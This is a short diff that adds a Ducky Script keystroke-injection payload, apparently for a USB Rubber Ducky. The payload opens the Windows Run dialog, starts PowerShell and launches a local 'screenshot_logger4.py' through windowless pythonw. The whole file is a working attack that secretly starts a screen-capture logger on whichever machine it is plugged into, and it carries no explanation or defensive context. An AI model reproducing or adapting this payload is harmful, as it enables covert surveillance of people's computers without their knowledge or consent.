@@ -1,0 +1,11 @@
+REM Open Run dialog
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 800
+
+REM Enter path
+STRING pythonw "C:\Users\iamdu\Hackyducky\screenshot_logger4.py"
+ENTER
